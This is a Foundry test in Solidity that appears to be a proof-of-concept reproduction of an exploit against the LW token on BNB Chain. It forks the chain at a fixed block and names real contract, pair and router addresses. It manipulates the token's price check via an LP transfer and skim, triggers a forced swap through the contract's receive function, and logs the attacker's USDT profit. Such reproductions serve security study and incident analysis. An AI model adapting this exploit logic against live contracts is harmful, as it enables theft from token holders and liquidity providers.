// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface ILW is IERC20 {
    function getTokenPrice() external view returns (uint256);
    function thanPrice() external view returns (uint256);
}

contract ContractTest is Test {
    ILW LW = ILW(payable(0x7B8C378df8650373d82CeB1085a18FE34031784F));
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 LP = Uni_Pair_V2(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_133_285);
    }

    function testExploit() public {
        deal(address(USDT), address(this), 1_000_000 * 1e18);

        // USDT To LW
        deal(address(USDT), address(this), 0);
        deal(address(LW), address(this), 3044671 * 1e18);

        LW.thanPrice();
        uint256 transferAmount = 2510e18 * 1e18 / LW.getTokenPrice();
        LW.transfer(address(LP), transferAmount);
        LW.thanPrice();
        LP.skim(address(this));
        payable(address(LW)).call{value: 1}(""); // Trigger the swap 3000e18 USDT to LW in the receive function

        // LW to USDT
        deal(address(USDT), address(this), 1085984 * 1e18);
        deal(address(LW), address(this), 0);

        deal(address(USDT), address(this), USDT.balanceOf(address(this)) - 1_002_507 * 1e18);

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
            );
    }
}
